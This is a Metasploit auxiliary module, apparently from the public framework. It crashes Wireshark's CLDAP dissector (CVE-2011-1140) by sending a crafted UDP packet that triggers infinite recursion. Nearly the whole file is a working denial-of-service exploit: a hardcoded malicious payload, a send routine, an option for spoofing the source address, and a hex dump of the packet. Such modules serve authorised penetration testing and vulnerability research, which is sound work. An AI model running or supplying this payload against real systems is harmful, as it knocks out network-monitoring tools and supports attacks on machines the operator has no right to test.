##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super( update_info(info,
      'Name'           => 'Wireshark CLDAP Dissector DOS',
      'Description'    => %q{
        This module causes infinite recursion to occur within the
        CLDAP dissector by sending a specially crafted UDP packet.
      },
      'Author'         => ['joernchen <joernchen[at]phenoelit.de> (Phenoelit)'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2011-1140'],
          [ 'OSVDB', '71552'],
          [ 'URL', 'http://www.wireshark.org/security/wnpa-sec-2011-04.html' ],
          [ 'URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5717' ],
        ],
      'DisclosureDate' => 'Mar 1 2011'))

    register_options([
      OptInt.new('RPORT', [true, 'The destination port', 389]),
      OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])
    ])
  end

  def run
    connect_udp
    cldap_payload = "\x30\x81\xa2\x02\x01\x01\x64\x81\x9c\x04\x00\x30\x81\x97\x30\x81"+
      "\x94\x04\x08\x6e\x65\x74\x6c\x6f\x67\x6f\x6e\x31\x81\x87\x04\x81"+
      "\x84\x17\x00\x00\x00\xfd\x03\x00\x00\xda\xae\x52\xd0\x2f\xb4\xa9"+
      "\x48\x8b\x16\x4e\xbc\x51\xf9\x60\xb4\xc0\x1a\xc0\x18\x0e\x63\x6f"+
      "\x6e\x74\x61\x63\x74\x2d\x73\x61\x6d\x62\x61\x34\xc0\x18\x0a\x43"+
      "\x4f\x4e\x54\x41\x43\x54\x44\x4f\x4d\x00\x10\x5c\x5c\x43\x4f\x4e"+
      "\x54\x41\x43\x54\x2d\x53\x41\x4d\x42\x41\x34\x00\x00\x00\x00\xc0"+
      "\x61\x05\x00\x00\x00\xff\xff\xff\xff\x30\x0c\x02\x01\x01\x65\x07"+
      "\x0a\x01\x00\x04\x00\x04\x00"
    print_status("Sending malformed CLDAP packet to #{rhost}")
    udp_sock.put(cldap_payload)
  end
end
=begin
Packet Dump:
  0000050: b054 3081 a202 0101 6481 9c04 0030 8197  .T0.....d....0..
  0000060: 3081 9404 086e 6574 6c6f 676f 6e31 8187  0....netlogon1..
  0000070: 0481 8417 0000 00fd 0300 00da ae52 d02f  .............R./
  0000080: b4a9 488b 164e bc51 f960 b4c0 1ac0 180e  ..H..N.Q.`......
  0000090: 636f 6e74 6163 742d 7361 6d62 6134 c018  contact-samba4..
  00000a0: 0a43 4f4e 5441 4354 444f 4d00 105c 5c43  .CONTACTDOM..\\C
  00000b0: 4f4e 5441 4354 2d53 414d 4241 3400 0000  ONTACT-SAMBA4...
  00000c0: 00c0 6105 0000 00ff ffff ff30 0c02 0101  ..a........0....
  00000d0: 6507 0a01 0004 0004 00                   e........
=end
